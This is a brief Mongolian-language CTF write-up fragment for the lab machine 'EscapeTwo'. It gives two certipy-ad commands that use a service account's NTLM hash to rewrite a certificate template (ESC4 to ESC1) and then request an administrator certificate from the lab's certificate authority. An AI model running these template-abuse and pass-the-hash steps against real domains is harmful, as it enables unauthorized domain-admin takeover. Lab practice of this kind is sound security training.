# EscapeTwo - CERTSRV_E_SUBJECT_DNS_REQUIRED / ESC4

`-target-ip`, `-dc-ip` бүх option-г оруулж өгөхөөр зүгээр ажилладаг.

[image]

**ESC4 --> ESC1 болгох:**

```bash
certipy-ad template -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -target dc01.sequel.htb -template DunderMifflinAuthentication -write-default-configuration -target-ip 10.10.11.51
```

**administrator.pfx файл авах:**

```bash
certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -ca sequel-DC01-CA -target dc01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb -target-ip 10.10.11.51
```

[image]
